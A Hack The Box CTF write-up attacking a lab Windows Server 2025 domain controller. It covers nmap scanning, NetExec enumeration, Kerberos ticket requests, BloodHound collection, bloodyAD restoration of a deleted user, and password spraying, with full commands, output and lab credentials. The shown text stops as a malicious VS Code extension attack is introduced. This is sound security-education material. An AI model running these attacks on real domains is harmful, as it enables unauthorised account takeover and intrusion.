---
title: CheckPoint
date: 2026-09-18
excerpt: HackTheBox - Medium
cover: ../uploads/cover_checkpoint.jpg
tags: Supply Chain Attack, BadSuccessor, VM Memory Forensics
---

Welcome to another Hack The Box writeup. This time we're tackling **CheckPoint**, an Active Directory box that starts with a set of *handed-to-you* credentials and turns into a long chain of AD misconfigurations: broken object permissions, an AD Recycle Bin abuse, a supply-chain-style attack against a VS Code extension share, a clever Kerberos delegation trick to steal a ticket without touching LSASS, and finally an abuse of Windows Server 2025's brand-new **delegated Managed Service Account (dMSA)** feature — the technique nicknamed **BadSuccessor**. The box wraps up with old-school VM memory forensics to recover the domain Administrator's NT hash.

Let's get started.

## Phase 1: Reconnaissance

We're given a starting foothold — valid domain credentials — before we've even touched the box:

```
alex.turner / Checkpoint2024!
```

Even with credentials in hand, the first step in any assessment is still a port scan, because it tells us exactly what services are exposed and confirms what kind of environment we're dealing with.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ nmap -A -T5 10.129.46.234
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-17 17:36 EDT
Nmap scan report for 10.129.46.234
Host is up (0.85s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-09-18 04:37:53Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Timing level 5 (Insane) used
No OS matches for host

Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-18T04:38:55
|_  start_date: N/A
|_clock-skew: 6h59m11s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT    ADDRESS
1   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 240.64 seconds
```

**Reading the results:** this port list is a textbook Active Directory Domain Controller fingerprint. A few ports are worth calling out individually, because each one tells us something about how we'll interact with the box later:

* **53 (DNS)** — Domain Controllers run their own DNS server so domain-joined machines can locate services via SRV records (e.g. `_ldap._tcp.dc._msdcs.checkpoint.htb`). We don't need to touch this directly, but it confirms DC01 is authoritative for the `checkpoint.htb` zone.
* **88 (Kerberos)** — This is the **Key Distribution Center (KDC)** port. Every ticket we request throughout this box — TGTs, service tickets, dMSA tickets — goes through here. Kerberos is *very* sensitive to clock drift, which becomes relevant almost immediately below.
* **135/139/445 (RPC / NetBIOS / SMB)** — These are how we'll browse file shares, and later use tools like `evil-winrm`, `smbclient`, and `secretsdump`-style tooling.
* **389/636/3268/3269 (LDAP / LDAPS / Global Catalog)** — This is the **directory service** itself: the database that stores every user, group, computer, OU, and — critically for this box — every **Access Control Entry (ACE)** describing who can read or write what. Almost the entire attack path on this box is really "walk the LDAP tree looking for objects we can write to."
* **464 (kpasswd)** — The protocol used for self-service password changes via Kerberos; not used in this box but expected on any DC.
* **593 (RPC over HTTP)** — Alternate transport for RPC, again just confirms this is a full DC.
* **5985 (WinRM)** — **Windows Remote Management**. This is our end-goal shell access method: once we have valid credentials or hashes for a privileged-enough account, we drop into a PowerShell session here with `evil-winrm`.

One detail buried in the Nmap host script output deserves its own callout: `clock-skew: 6h59m11s`. Kerberos authentication *requires* the client and server clocks to be within a small tolerance of each other (5 minutes, by default) — this is a deliberate anti-replay-attack design decision baked into the Kerberos protocol (RFC 4120). If our attacking machine's clock is off by almost 7 hours relative to the DC, **every single Kerberos ticket request will fail** with a "clock skew too great" error, even with perfectly valid credentials. We'll have to fix this before Kerberos-based tooling will work — see the `ntpdate` step below.

We also add the target to our hosts file, since AD-integrated services (Kerberos SPNs, LDAP referrals, etc.) expect to be addressed by hostname rather than raw IP:

```
# /etc/hosts
10.129.46.234   DC01.checkpoint.htb     checkpoint.htb  DC01
```

---

## Phase 2: Validating Credentials & Understanding the Domain

With the handed-to-us credentials, the natural next step is to confirm they actually work, and to see which protocols accept them. For this we use **NetExec** (`nxc`, the actively maintained fork of the well-known CrackMapExec), a Swiss-army-knife tool for AD environments that can authenticate over SMB, LDAP, WinRM, MSSQL, and more, and layer enumeration modules on top of a valid session.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ nxc smb DC01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' 
SMB         10.129.46.234   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.46.234   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
                                                                                                                                                                                             
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ nxc ldap DC01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!'
LDAP        10.129.46.234   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.46.234   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
```

**Reading the results:** both protocols authenticate successfully, and we learn something extra as a bonus — the banner confirms this is **Windows Server 2025** (build 26100). That's an important detail to keep in the back of our mind: Server 2025 shipped a brand-new AD feature called **delegated Managed Service Accounts (dMSA)**, and — as we'll see later — a fresh attack technique against it is exactly what this box is built around. Naming the OS version this early is a strong hint about where the box is going.

We also note `signing:True` for SMB and `signing:Enforced` for LDAP — meaning we can't relay these authentications (e.g. via NTLM relay to another host), so our path forward has to be *direct* credential/ticket abuse rather than a relay attack.

### Enumerating Domain Users over LDAP

Now that we know LDAP accepts our creds, let's use it to pull down the full list of domain users. LDAP (Lightweight Directory Access Protocol) is how basically everything in AD is queried — every object (user, group, computer, OU, GPO) is a directory entry with attributes, and LDAP is the protocol used to search and filter that tree.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ nxc ldap DC01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users-export users.txt
LDAP        10.129.46.234   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.46.234   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
LDAP        10.129.46.234   389    DC01             [*] Enumerated 17 domain users: checkpoint.htb
LDAP        10.129.46.234   389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.46.234   389    DC01             Administrator                 2026-05-09 12:16:34 0        Built-in account for administering the computer/domain      
LDAP        10.129.46.234   389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.46.234   389    DC01             krbtgt                        2026-05-09 04:41:01 0        Key Distribution Center Service Account                     
LDAP        10.129.46.234   389    DC01             alex.turner                   2026-05-09 05:00:08 0                                                                    
LDAP        10.129.46.234   389    DC01             ryan.brooks                   2026-05-10 09:46:18 0                                                                    
LDAP        10.129.46.234   389    DC01             svc_deploy                    2026-05-09 05:01:19 0        Deployment service account                                  
LDAP        10.129.46.234   389    DC01             james.harper                  2026-05-09 05:02:53 0                                                                    
LDAP        10.129.46.234   389    DC01             sarah.mitchell                2026-05-09 05:02:58 0                                                                    
LDAP        10.129.46.234   389    DC01             emily.carter                  2026-05-09 05:03:05 0                                                                    
LDAP        10.129.46.234   389    DC01             david.reynolds                2026-05-09 05:03:11 0                                                                    
LDAP        10.129.46.234   389    DC01             jessica.coleman               2026-05-09 05:03:15 0                                                                    
LDAP        10.129.46.234   389    DC01             lauren.flores                 2026-05-09 05:03:21 0                                                                    
LDAP        10.129.46.234   389    DC01             michael.torres                2026-05-09 05:03:28 0                                                                    
LDAP        10.129.46.234   389    DC01             kevin.patterson               2026-05-09 05:03:33 0                                                                    
LDAP        10.129.46.234   389    DC01             brian.jenkins                 2026-05-09 05:03:37 0                                                                    
LDAP        10.129.46.234   389    DC01             megan.perry                   2026-05-09 05:03:42 0                                                                    
LDAP        10.129.46.234   389    DC01             max.palmer                    2026-05-25 21:25:15 0                                                                    
LDAP        10.129.46.234   389    DC01             [*] Writing 17 local users to users.txt
```

**Reading the results:** we now have a full list of 17 domain users, saved locally to `users.txt` for later brute-forcing/spraying attempts. A couple of accounts stand out immediately:

* `svc_deploy` — the description *"Deployment service account"* is a strong signal. Service accounts used for deployment pipelines are frequently over-privileged (they often need write access to shares, the ability to push software, etc.), which makes them attractive escalation targets.
* `krbtgt` — this is the special account whose secret key is used to encrypt/sign every Kerberos ticket in the domain. We won't touch it directly, but you'll see it referenced inside every raw Kerberos ticket blob later on (`SNAME: krbtgt`) — that's just the *normal* structure of a Kerberos ticket, not something we compromised.
* `max.palmer` has a noticeably more recent "Last PW Set" date than everyone else — worth remembering, since that account ends up owning the final flag.

### Enumerating SMB Shares

Next, let's see what file shares are exposed. SMB (Server Message Block) is the Windows file-sharing protocol, and enumerating shares often reveals far more than the services list alone — misconfigured share permissions are one of the most common AD entry points in real environments (and in HTB boxes).

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ nxc smb DC01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --shares
SMB         10.129.46.234   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.46.234   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB         10.129.46.234   445    DC01             [*] Enumerated shares
SMB         10.129.46.234   445    DC01             Share           Permissions     Remark
SMB         10.129.46.234   445    DC01             -----           -----------     ------
SMB         10.129.46.234   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.46.234   445    DC01             C$                              Default share
SMB         10.129.46.234   445    DC01             DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.46.234   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.46.234   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.46.234   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.46.234   445    DC01             VMBackups                 
```

**Reading the results:** `ADMIN$` and `C$` are Windows' default administrative shares (only accessible to local admins — not useful to us as `alex.turner`). `IPC$`, `NETLOGON`, and `SYSVOL` are also standard DC shares used for inter-process communication and Group Policy distribution.

Two shares are genuinely interesting, and both come back into play later:

* **`DevDrop`** — its remark tells us exactly what it's for: *"VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0."* That's an unusually specific description for a share, which is a strong signal that some automated process — likely a CI/CD or deployment pipeline — watches this share and installs whatever `.vsix` extension packages land in it. We only have `READ` here as `alex.turner`, so we can look but not (yet) write.
* **`VMBackups`** — no permissions are listed at all under `alex.turner`, meaning this account currently has *no* access to it. We'll need higher privileges before we can explore it — and when we eventually do, it turns out to hold a decommissioned VM's memory snapshot, which becomes the final key to full compromise.

### Fixing the Kerberos Clock Skew & Requesting a TGT

Before using any Kerberos-based tooling (which most of the rest of this box relies on), we need to correct that ~7-hour clock skew Nmap flagged earlier. `ntpdate -u DC01` synchronizes our attack machine's clock against the DC over NTP, which is the standard fix for this in CTF/pentest environments.

Once our clock is in sync, we use `impacket-getTGT` to request a full **Ticket Granting Ticket (TGT)** for `alex.turner`. A quick primer on what that actually means:

* In Kerberos, you don't send your password to every service you want to access. Instead, you authenticate *once* to the KDC (port 88) and receive a TGT — proof that you are who you say you are, valid for a set lifetime (10 hours, by default in AD).
* From then on, whenever you want to talk to a specific service (LDAP, SMB/CIFS, HTTP, etc.), you present that TGT back to the KDC and request a **service ticket (TGS)** scoped to that specific service, without re-entering your password.
* Impacket stores these tickets on disk in a **ccache** file (the Linux/MIT-Kerberos on-disk ticket cache format), and tools that support Kerberos authentication will pick it up automatically if we point the `KRB5CCNAME` environment variable at it.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ sudo ntpdate -u DC01 && impacket-getTGT checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.46.234
2026-09-18 01:18:24.915537 (-0400) +25149.616355 +/- 0.051057 DC01 10.129.46.234 s1 no-leap
CLOCK: time stepped by 25149.616355
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in alex.turner.ccache
```

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ export KRB5CCNAME=alex.turner.ccache 
```

With `KRB5CCNAME` exported, every Kerberos-aware tool we run from this point on (RustHound-CE, bloodyAD, etc.) will silently use this cached TGT instead of asking for a password — and, crucially, it means we're authenticating with a genuine Kerberos ticket rather than NTLM, which several of the later attacks specifically require.

---

## Phase 3: Mapping the Domain with BloodHound

With working Kerberos authentication, it's time to build a full picture of the Active Directory environment — not just users and groups, but the **relationships** between them: who's a member of what, who can reset whose password, who has write access to which objects, and so on. This is exactly what **BloodHound** is built for.

We use **RustHound-CE**, a fast Rust reimplementation of the original BloodHound.py/SharpHound collectors, to pull this data out over LDAP and Kerberos and package it into JSON files that BloodHound's graph database (Neo4j) can ingest.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ sudo ntpdate -u DC01 && rusthound-ce -d checkpoint.htb -u alex.turner@checkpoint.htb -k -f DC01.checkpoint.htb -i 10.129.46.234 -n 10.129.46.234 -c All -z
2026-09-18 01:20:00.059074 (-0400) +25149.214996 +/- 0.103723 DC01 10.129.46.234 s1 no-leap
CLOCK: time stepped by 25149.214996
---------------------------------------------------
Initializing RustHound-CE at 01:20:00 on 09/18/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-09-18T05:20:00Z INFO  rusthound_ce] Verbosity level: Info
[2026-09-18T05:20:00Z INFO  rusthound_ce] Collection method: All
[2026-09-18T05:20:04Z INFO  rusthound_ce::transport::ldap] Connected to CHECKPOINT.HTB Active Directory!
[2026-09-18T05:20:04Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-18T05:20:08Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=checkpoint,DC=htb
[2026-09-18T05:20:08Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-18T05:20:09Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=checkpoint,DC=htb
[2026-09-18T05:20:09Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-18T05:20:09Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=checkpoint,DC=htb
[2026-09-18T05:20:09Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-17T22:20:59Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=checkpoint,DC=htb
[2026-09-17T22:20:59Z INFO  rusthound_ce::transport::ldap] Ldap filter : (objectClass=*)
[2026-09-17T22:21:03Z INFO  rusthound_ce::transport::ldap] All data collected for NamingContext CN=Configuration,DC=checkpoint,DC=htb
[2026-09-17T22:21:03Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-09-17T22:21:03Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-09-17T22:21:03Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-09-17T22:21:03Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-09-17T22:21:03Z INFO  rusthound_ce::modules::sessions] [sessions] 0 active target(s) after expiry/enabled filter
[2026-09-17T22:21:03Z INFO  rusthound_ce::modules::sessions] [sessions] 0 session(s) enumerated in total across 0 host(s)
[2026-09-17T22:21:03Z WARN  rusthound_ce::transport::kerberos] [krb] TGS-REP error for cifs/DC01.checkpoint.htb: KDC error 37
[2026-09-17T22:21:03Z WARN  rusthound_ce::modules] [gpo] SYSVOL collection failed: TGS-REP: KDC error 37
[2026-09-17T22:21:03Z INFO  rusthound_ce::json::maker::common] 19 users parsed!
[2026-09-17T22:21:03Z INFO  rusthound_ce::json::maker::common] 70 groups parsed!
[2026-09-17T22:21:03Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-09-17T22:21:03Z INFO  rusthound_ce::json::maker::common] 8 ous parsed!
[2026-09-17T22:21:03Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-09-17T22:21:03Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-09-17T22:21:03Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-09-17T22:21:03Z INFO  rusthound_ce::json::maker::common] .//20260917182103_checkpoint-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 18:21:03 on 09/17/26! Happy Graphing!
```

**Breaking down the flags used:**

* `-d checkpoint.htb` — target domain.
* `-u alex.turner@checkpoint.htb -k` — authenticate as `alex.turner`, using Kerberos (`-k`) rather than NTLM — this is why exporting `KRB5CCNAME` earlier mattered; without a valid ticket cached, `-k` would have nothing to authenticate with.
* `-c All` — collection method `All`, meaning gather every category of data BloodHound understands: group memberships, local admin rights, session data, ACLs/DACLs, trusts, GPOs, and more.
* `-z` — compress the output into a single zip for easy import into the BloodHound UI.

**Reading the results:** the collector successfully walks all four LDAP naming contexts (the Schema, the domain partition, and both DNS application partitions), and ends up parsing 19 users, 70 groups, 1 computer, 8 OUs, and — importantly — *ACL data for all of them*. The one warning we see (`KDC error 37` — "clock skew too great" — while trying to fetch a `cifs/DC01` ticket for SYSVOL) is a leftover artifact of a tiny bit of remaining drift and only prevents the optional GPO/SYSVOL file collection module; it doesn't affect the ACL/group data we actually need.

With the zip generated, we import it into BloodHound's Neo4j-backed UI to visually explore the resulting attack graph:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FpUu1n8Dzs4m4fxpRuH1H%252FScreenshot%2520%283399%29.png%3Falt%3Dmedia%26token%3Ddc77d58e-c000-4084-b8ee-a4e995ab95b1&width=768&dpr=3&quality=100&sign=94d9ca53ef0f870feb2ac608bc4e0bd0&sv=3)

### Finding What We Can Write To

BloodHound's graph view is great for visual exploration, but when we already know *who* we are and just want a quick, scriptable answer to "what can this specific user modify?", **bloodyAD** is faster. BloodyAD is a command-line AD privilege-escalation framework that talks directly to LDAP and can both *read* and *write* directory objects — it's effectively a Swiss-army-knife for abusing the exact kind of ACL misconfigurations BloodHound is built to surface.

Its `get writable` command walks every object in the domain and reports back anything the authenticated principal has a meaningful **DACL** permission on. A quick primer on that term:

> **DACL (Discretionary Access Control List)** is the list of permissions attached to every AD object, made up of individual **ACEs (Access Control Entries)**. Each ACE says "this security principal is allowed (or denied) this specific right on this object" — rights like `GenericWrite`, `WriteOwner`, `CREATE_CHILD`, or a plain `WRITE` on a specific attribute. Because AD's built-in permission model is so granular, it's extremely common for administrators to accidentally grant more rights than intended — and those over-grants are exactly what tools like BloodHound and bloodyAD are designed to surface.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ bloodyad --host DC01.checkpoint.htb -d checkpoint.htb -u alex.turner -k get writable

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

**Reading the results — one entry immediately jumps out:**

```
distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE
```

The `CN=Deleted Objects` container and the `\0ADEL:` prefix (along with a GUID suffix) are the unmistakable signature of the **AD Recycle Bin**. Here's what's going on:

> When the AD Recycle Bin feature is enabled (it is, by default, on modern Windows Server), deleting an object doesn't immediately destroy it. Instead, AD **tombstones** it: the object is stripped of most of its attributes, renamed with a `\0ADEL:<objectGUID>` suffix, and relocated under the special `CN=Deleted Objects` container, where it sits for a configurable retention period (180 days, by default) before being permanently purged. Critically, a tombstoned object's **original permissions can persist** on it during this window — and if whoever deleted `mark.davies` didn't scrub the DACL, or if `alex.turner`'s write permission was inherited from a level above (like the OU), we can potentially still write to it, which includes the ability to *restore* it.

This is the equivalent of finding an "undo delete" button that a misconfigured environment forgot to lock. We have `WRITE` on a deleted user object — let's use it.

### Restoring a Deleted User

BloodyAD exposes exactly this primitive via its `set restore` action, which reverses the tombstone process — reinstating the object back into its original (or a specified) location in the live directory tree, attributes and group memberships intact.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ sudo ntpdate -u DC01 && bloodyad --host DC01.checkpoint.htb -d checkpoint.htb -u alex.turner -k set restore 'mark.davies'
2026-09-18 01:35:35.439173 (-0400) +25150.699070 +/- 0.056941 DC01 10.129.46.234 s1 no-leap
CLOCK: time stepped by 25150.699070
[+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

`mark.davies` is now a fully live, enabled AD account again — we've turned a stray write permission on a "deleted" object into a brand-new user in the directory. Note that restoring the object does **not** hand us its password; the account's password hash is preserved from before deletion, but we don't have the plaintext (or the hash) yet. What we do get, though, is a new username to test against passwords we already know.

### Confirming the New Account & Trying Password Reuse

Re-running our LDAP user export confirms `mark.davies` now shows up as an 18th domain user:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ nxc ldap DC01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users-export users.txt                                                                
LDAP        10.129.46.234   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.46.234   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
LDAP        10.129.46.234   389    DC01             [*] Enumerated 18 domain users: checkpoint.htb
LDAP        10.129.46.234   389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.46.234   389    DC01             Administrator                 2026-05-09 12:16:34 0        Built-in account for administering the computer/domain      
LDAP        10.129.46.234   389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.46.234   389    DC01             krbtgt                        2026-05-09 04:41:01 0        Key Distribution Center Service Account                     
LDAP        10.129.46.234   389    DC01             alex.turner                   2026-05-09 05:00:08 0                                                                    
LDAP        10.129.46.234   389    DC01             mark.davies                   2026-05-09 05:00:48 0                                                                    
LDAP        10.129.46.234   389    DC01             ryan.brooks                   2026-05-10 09:46:18 0                                                                    
LDAP        10.129.46.234   389    DC01             svc_deploy                    2026-05-09 05:01:19 0        Deployment service account                                  
LDAP        10.129.46.234   389    DC01             james.harper                  2026-05-09 05:02:53 0                                                                    
LDAP        10.129.46.234   389    DC01             sarah.mitchell                2026-05-09 05:02:58 0                                                                    
LDAP        10.129.46.234   389    DC01             emily.carter                  2026-05-09 05:03:05 0                                                                    
LDAP        10.129.46.234   389    DC01             david.reynolds                2026-05-09 05:03:11 0                                                                    
LDAP        10.129.46.234   389    DC01             jessica.coleman               2026-05-09 05:03:15 0                                                                    
LDAP        10.129.46.234   389    DC01             lauren.flores                 2026-05-09 05:03:21 0                                                                    
LDAP        10.129.46.234   389    DC01             michael.torres                2026-05-09 05:03:28 0                                                                    
LDAP        10.129.46.234   389    DC01             kevin.patterson               2026-05-09 05:03:33 0                                                                    
LDAP        10.129.46.234   389    DC01             brian.jenkins                 2026-05-09 05:03:37 0                                                                    
LDAP        10.129.46.234   389    DC01             megan.perry                   2026-05-09 05:03:42 0                                                                    
LDAP        10.129.46.234   389    DC01             max.palmer                    2026-05-25 21:25:15 0                                                                    
LDAP        10.129.46.234   389    DC01             [*] Writing 18 local users to users.txt
```

With a full, up-to-date username list, it's worth trying a classic and often surprisingly effective technique: **password reuse / spraying** — testing the one password we already know (`Checkpoint2024!`) against every account in `users.txt`. `nxc`'s `--continue-on-success` flag tells it to keep testing every user in the list even after finding valid hits, rather than stopping at the first success:

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ nxc ldap DC01.checkpoint.htb -u users.txt -p 'Checkpoint2024!' --continue-on-success
LDAP        10.129.46.234   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.129.46.234   389    DC01             [-] checkpoint.htb\Administrator:Checkpoint2024! 
LDAP        10.129.46.234   389    DC01             [-] checkpoint.htb\Guest:Checkpoint2024! 
LDAP        10.129.46.234   389    DC01             [-] checkpoint.htb\krbtgt:Checkpoint2024! 
LDAP        10.129.46.234   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
LDAP        10.129.46.234   389    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
...
```

**Reading the results:** it pays off — `mark.davies` shares the exact same password as `alex.turner`. This is an entirely realistic finding in real environments too: when accounts are provisioned in bulk (e.g. from an HR onboarding script, or restored from a backup/template), it's common for a shared default password to leak across multiple accounts if nobody forces a reset. We now effectively control a second identity in the domain, with no cracking required.

---

## Phase 4: Abusing Share Write Access — A Malicious VS Code Extension

Now that we're `mark.davies`, it's worth re-checking share permissions — different users often have different access levels to the same shares, and the earlier `DevDrop` share (remember, described as a *"VS Code extensions share for approved .vsix packages"*) is exactly the kind of thing worth rechecking.

```shell
┌──(kuroshiro㉿a1sberg)-[~/HTB/CheckPoint]
└─$ nxc smb DC01.checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --shares
SMB         10.129.46.234   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.46.234   445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
SMB         10.129.46.234   445    DC01             [*] Enumerated shares
SMB         10.129.46.234   445    DC01             Share           Permissions     Remark
SMB         10.129.46.234   445    DC01             -----           -----------     ------
SMB         10.129.46.234   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.46.234   445    DC01             C$                              Default share
SMB         10.129.46.234   445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.46.234   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.46.234   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.46.234   445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.46.234   445    DC01             VMBackups 
```

**Reading the results:** confirmed — `mark.davies` has `READ,WRITE` on `DevDrop`, versus the read-only access `alex.turner` had. That's our opening. Let's browse the share to see what's already sitting there:

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FdR9vj8WjfDY5M562lgwl%252FScreenshot%2520%283400%29.png%3Falt%3Dmedia%26token%3D2720dacc-69b2-4989-b105-a21274a96b47&width=768&dpr=3&quality=100&sign=5ed82c6f9d1528a4b00dfb5f57f761f1&sv=3)

While digging around BloodHound for context on why `mark.davies` might have this write access, we also find the distinguished name of a `DEVTEAM` group he belongs to, tying the account directly to whatever process manages this share:

Distinguished name of DEVTEAM Group

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FH3GLoHOuHUL9VVjUVbAJ%252FScreenshot%2520%283401%29.png%3Falt%3Dmedia%26token%3D3205b2ac-1a17-4ca7-9b6e-da23b181a033&width=768&dpr=3&quality=100&sign=5bb33f85cc1ae1983adb35c7a84e360b&sv=3)

### Understanding the Attack Surface: What's a `.vsix`?

The share's remark told us this is for *"approved .vsix packages compatible with VS Code engine 1.118.0."* This is a strong hint toward a **supply-chain attack**: if some automated process (a developer's machine, a CI job, a scheduled task) periodically installs whatever `.vsix` files show up in this share, then writing a malicious one is functionally equivalent to getting arbitrary code execution on whatever installs it.

